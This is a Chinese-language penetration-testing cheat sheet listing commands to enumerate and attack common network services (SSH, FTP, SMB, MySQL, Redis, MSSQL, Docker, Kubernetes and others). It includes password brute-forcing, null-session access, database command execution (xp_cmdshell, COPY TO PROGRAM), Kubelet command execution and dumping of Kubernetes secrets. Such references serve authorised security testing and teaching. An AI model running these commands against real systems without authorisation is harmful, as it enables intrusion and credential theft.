# 网络服务漏洞手册

## SSH (22)

### 漏洞检查

```bash
# 版本漏洞
nmap -sV -p22 TARGET
# OpenSSH < 7.7: CVE-2018-15473 用户名枚举
# OpenSSH < 8.3p1: CVE-2020-15778 命令注入
# OpenSSH < 9.3p2: CVE-2023-38408 PKCS#11 RCE

# 弱口令
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4 -f
# 常见用户: root admin user test oracle postgres

# SSH 密钥问题
# Debian 弱密钥（CVE-2008-0166）
nmap --script=ssh-hostkey --script-args ssh_hostkey=full -p22 TARGET

# 认证方式
nmap --script=ssh-auth-methods -p22 TARGET
# 如果允许密码认证 → 可爆破
# 如果允许 keyboard-interactive → 可能绕过某些限制
```

### 利用后检查

```bash
# 检查 SSH 配置
cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"
# 关注：PermitRootLogin / PasswordAuthentication / AllowUsers
# authorized_keys 中的公钥
cat ~/.ssh/authorized_keys
```

---

## FTP (21)

### 漏洞检查

```bash
# 匿名登录
ftp TARGET
# 用户名 anonymous, 密码空或 email

nmap --script=ftp-anon -p21 TARGET

# 版本漏洞
nmap -sV -p21 TARGET
# vsftpd 2.3.4: 后门 (CVE-2011-2523)
# ProFTPD 1.3.5: mod_copy RCE

nmap --script=ftp-vsftpd-backdoor -p21 TARGET

# 弱口令
hydra -L users.txt -P passwords.txt ftp://TARGET -t 10

# 可写目录
# 如果有写权限 → 上传 WebShell（如果 FTP 根目录与 Web 根目录重叠）

# FTP Bounce
nmap --script=ftp-bounce -p21 TARGET
```

---

## SMB (139/445)

### 漏洞检查

```bash
# 综合枚举
enum4linux -a TARGET
crackmapexec smb TARGET

# 共享枚举
smbclient -L //TARGET -N
smbmap -H TARGET
smbmap -H TARGET -u guest -p ""

# 空会话/匿名访问
rpcclient -U "" -N TARGET
rpcclient -U "" -N TARGET -c "enumdomusers"
rpcclient -U "" -N TARGET -c "enumdomgroups"

# 漏洞检测
nmap --script="smb-vuln*" -p445 TARGET

# 关键漏洞
# MS17-010 EternalBlue（Windows 7/2008/2012/2016）
nmap --script=smb-vuln-ms17-010 -p445 TARGET
# MS08-067（Windows XP/2003）
nmap --script=smb-vuln-ms08-067 -p445 TARGET

# 签名检测
nmap --script=smb-security-mode -p445 TARGET
# SMB 签名禁用 → 可进行中继攻击

# 密码喷洒
crackmapexec smb TARGET -u users.txt -p 'Password123' --continue-on-success

# 敏感共享文件搜索
smbmap -H TARGET -u USER -p PASS -r SHARE --depth 5
# 寻找：密码文件、配置文件、备份文件、脚本
```

---

## 数据库服务

### MySQL (3306)

```bash
# 信息收集
nmap --script=mysql-info,mysql-enum -p3306 TARGET

# 弱口令
hydra -L users.txt -P passwords.txt mysql://TARGET
# 常见：root:root / root:空 / root:mysql / root:123456

# 连接测试
mysql -h TARGET -u root -p
# 获取版本
SELECT VERSION();
# 列出数据库
SHOW DATABASES;
# 检查权限
SHOW GRANTS;
# 可写文件检查
SELECT @@secure_file_priv;
# UDF 提权可能性
SHOW VARIABLES LIKE 'plugin_dir';
```

### Redis (6379)

```bash
# 未授权访问（最常见漏洞）
redis-cli -h TARGET
INFO
CONFIG GET dir
CONFIG GET dbfilename
KEYS *

# 如果存在未授权访问，利用路径：
# 1. 写 SSH 公钥
# 2. 写 WebShell（需要知道 Web 路径）
# 3. 写 Crontab
# 4. 主从复制 RCE

# 弱口令
hydra -P passwords.txt redis://TARGET
```

### PostgreSQL (5432)

```bash
# 弱口令
hydra -L users.txt -P passwords.txt postgres://TARGET

# 连接后
# 列出数据库
\l
# 当前用户
SELECT current_user;
# 超级用户检查
SELECT usename, usesuper FROM pg_user;
# 命令执行
COPY (SELECT '') TO PROGRAM 'id';
```

### MSSQL (1433)

```bash
# 信息收集
nmap --script=ms-sql-info -p1433 TARGET

# 弱口令
hydra -L users.txt -P passwords.txt mssql://TARGET
# 常见: sa:sa / sa:password / sa:Password123

# 连接后
# xp_cmdshell 命令执行
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### MongoDB (27017)

```bash
# 未授权访问
mongosh --host TARGET --eval "db.adminCommand('listDatabases')"
nmap --script=mongodb-info,mongodb-databases -p27017 TARGET
```

### Elasticsearch (9200)

```bash
# 未授权访问
curl -s http://TARGET:9200/
curl -s http://TARGET:9200/_cat/indices?v
curl -s http://TARGET:9200/_search?pretty

# 敏感数据搜索
curl -s http://TARGET:9200/_search?q=password&pretty
curl -s http://TARGET:9200/_search?q=secret&pretty
```

---

## SMTP (25/587)

```bash
# 用户枚举
smtp-user-enum -M VRFY -U users.txt -t TARGET
smtp-user-enum -M RCPT -U users.txt -t TARGET
nmap --script=smtp-enum-users -p25 TARGET

# 开放中继
nmap --script=smtp-open-relay -p25 TARGET

# 手动测试
telnet TARGET 25
HELO test
MAIL FROM:<test@test.com>
RCPT TO:<admin@target.com>
```

---

## SNMP (161/UDP)

```bash
# Community String 爆破
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET

# 完整枚举（获得 community string 后）
snmpwalk -v2c -c public TARGET
snmpbulkwalk -v2c -c public TARGET

# 关键 OID
# 系统信息: 1.3.6.1.2.1.1
# 接口信息: 1.3.6.1.2.1.2
# 进程列表: 1.3.6.1.2.1.25.4.2.1.2
# 已安装软件: 1.3.6.1.2.1.25.6.3.1.2
# 用户列表: 1.3.6.1.4.1.77.1.2.25
# TCP 连接: 1.3.6.1.2.1.6.13.1.3

# SNMP v3 如果有写权限 → 可能修改配置
```

---

## LDAP (389/636)

```bash
# 匿名绑定
ldapsearch -x -H ldap://TARGET -b "" -s base namingContexts
ldapsearch -x -H ldap://TARGET -b "dc=example,dc=com"

# 用户枚举
ldapsearch -x -H ldap://TARGET -b "dc=example,dc=com" "(objectclass=user)" sAMAccountName

# 密码策略
ldapsearch -x -H ldap://TARGET -b "dc=example,dc=com" "(objectclass=domain)" lockoutDuration lockoutThreshold
```

---

## Docker (2375/2376)

```bash
# 未授权 API
curl -s http://TARGET:2375/version
curl -s http://TARGET:2375/containers/json
curl -s http://TARGET:2375/images/json

# 如果未授权 → 可以创建特权容器挂载宿主机文件系统
```

---

## Kubernetes (6443/8443/10250)

```bash
# API Server 未授权
curl -sk https://TARGET:6443/api/v1/pods
curl -sk https://TARGET:6443/api/v1/secrets

# Kubelet 未授权
curl -sk https://TARGET:10250/pods
curl -sk https://TARGET:10250/run/<namespace>/<pod>/<container> -d "cmd=id"

# etcd 未授权 (2379)
curl -s http://TARGET:2379/v2/keys/?recursive=true
```
